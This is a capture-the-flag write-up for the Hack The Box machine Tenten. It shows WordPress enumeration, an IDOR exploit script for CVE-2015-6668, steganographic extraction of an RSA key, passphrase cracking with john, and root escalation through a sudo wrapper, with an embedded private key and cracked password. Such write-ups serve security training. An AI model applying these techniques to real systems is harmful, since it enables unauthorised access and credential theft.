---
title: "[HTB] Machine: Tenten"
description: "[HTB] Machine: Tenten"
date: 2023-09-01
menu:
  sidebar:
    name: "[HTB] Machine: Tenten"
    identifier: htb-machine-Tenten
    parent: htb-machines-linux
    weight: 10
hero: images/tenten.png
tags: ["HTB", "wordpress", "wpscan", "wp-job-manager", "cve-2015-6668", "python", "steganography", "steghide", "ssh", "john", "sudo", "mysql"]
---

# Tenten
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.10 -T4                            
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 17:38 BST
Nmap scan report for 10.10.10.10 (10.10.10.10)
Host is up (0.094s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```
```
└─$ nmap -Pn -p22,80 -sC -sV  10.10.10.10 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 17:54 BST
Nmap scan report for 10.10.10.10 (10.10.10.10)
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://tenten.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
- Web Server

![](./images/1.png)

- `wpscan`
```
└─$ wpscan --url http://tenten.htb                                                                    
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://tenten.htb/ [10.10.10.10]
[+] Started: Sat Sep  2 11:01:54 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://tenten.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://tenten.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://tenten.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://tenten.htb/index.php/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - http://tenten.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://tenten.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://tenten.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver=4.7.3
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] job-manager
 | Location: http://tenten.htb/wp-content/plugins/job-manager/
 | Latest Version: 0.7.25 (up to date)
 | Last Updated: 2015-08-25T22:44:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.2.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://tenten.htb/wp-content/plugins/job-manager/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Sep  2 11:02:08 2023
[+] Requests Done: 173
[+] Cached Requests: 5
[+] Data Sent: 41.965 KB
[+] Data Received: 392.056 KB
[+] Memory used: 240.5 MB
[+] Elapsed time: 00:00:14

```
## Foothold
- Gooling shows [CVE-2015-6668](https://wpscan.com/vulnerability/8167)
  - It looks like an `IDOR` vulnerability
  - We can visit `http://tenten.htb/index.php/jobs/apply/<id>/`
    - By changing `id` we can leak post titles in the database

```
└─$ curl -s http://tenten.htb/index.php/jobs/apply/8/ | grep title
<title>Job Application: Pen Tester &#8211; Job Portal</title>
<link rel="alternate" type="application/rss+xml" title="Job Portal &raquo; Feed" href="http://tenten.htb/index.php/feed/" />
<link rel="alternate" type="application/rss+xml" title="Job Portal &raquo; Comments Feed" href="http://tenten.htb/index.php/comments/feed/" />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://tenten.htb/xmlrpc.php?rsd" />
        <link rel="alternate" type="application/rss+xml" href="http://tenten.htb/index.php/jobs/feed/" title="Latest Jobs" />
                jobman_selected_jobs_names.push( jQuery(this).attr( 'title' ) );
                jobman_selected_cats_names.push( jQuery(this).attr( 'title' ) );
                                                        <p class="site-title"><a href="http://tenten.htb/" rel="home">Job Portal</a></p>
                <h1 class="entry-title">Job Application: Pen Tester</h1>                        </header><!-- .entry-header -->
                                                                                                                                 
```
```
└─$ curl -s http://tenten.htb/index.php/jobs/apply/8/ | grep "entry-title" | cut -d'>' -f2 | cut -d'<' -f1
Job Application: Pen Tester
```

- Let's loop through
```
└─$ for i in {1..30}; do (echo -n "$i: " && curl -s http://tenten.htb/index.php/jobs/apply/$i/ | grep "entry-title" | cut -d'>' -f2 | cut -d'<' -f1); done
1: Job Application: Hello world!
2: Job Application: Sample Page
3: Job Application: Auto Draft
4: Job Application
5: Job Application: Jobs Listing
6: Job Application: Job Application
7: Job Application: Register
8: Job Application: Pen Tester
9: Job Application:
10: Job Application: Application
11: Job Application: cube
12: Job Application: Application
13: Job Application: HackerAccessGranted
14: Job Application
15: Job Application
16: Job Application
17: Job Application
18: Job Application
19: Job Application
20: Job Application
21: Job Application
22: Job Application
23: Job Application
24: Job Application
25: Job Application
26: Job Application
27: Job Application
28: Job Application
29: Job Application
30: Job Application
```

- Using the script below, we can find associated resume uploads

```
import requests

print """  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2013,2018):  
    for i in range(1,13):
        for extension in {'doc','pdf','docx'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
```

- Let's try it
  - I went through all possible job applications, increased year range and also added `jpg` extension
```
└─$ python2.7 cve-2015-6668.py
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://tenten.htb/
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://tenten.htb//wp-content/uploads/2017/04/HackerAccessGranted.jpg

```

- Image
  - http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg

![](./images/2.png)

- So it looks like it could be `stenography`
```
└─$ steghide extract -sf HackerAccessGranted.jpg 
Enter passphrase: 
the file "id_rsa" does already exist. overwrite ? (y/n) y
wrote extracted data to "id_rsa".
```

- The key is encrypted

```
└─$ cat id_rsa        
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C

/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
-----END RSA PRIVATE KEY-----

```

- Let's use `john`
```
└─$ ssh2john id_rsa > id_rsa.hash 
```
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa)     
1g 0:00:00:00 DONE (2023-09-02 11:43) 3.333g/s 2600Kp/s 2600Kc/s 2600KC/s superpene..supermoy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- We can try a username `takis` from website

![](./images/3.png)

![](./images/4.png)

## Root
- `sudo -l`
```
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin

```
- If we had password we could run everything, but without it we can only run `/bin/fuckin`

```
takis@tenten:~$ file /bin/fuckin
/bin/fuckin: Bourne-Again shell script, ASCII text executable
```
```
takis@tenten:~$ cat /bin/fuckin
#!/bin/bash
$1 $2 $3 $4
```
- It just passes 4 arguments
  - Let's try `id`
```
takis@tenten:~$ sudo /bin/fuckin id
uid=0(root) gid=0(root) groups=0(root)
```

- We can read flag
```
takis@tenten:~$ sudo /bin/fuckin cat /root/root.txt
3965120f71fefbc75e**************
```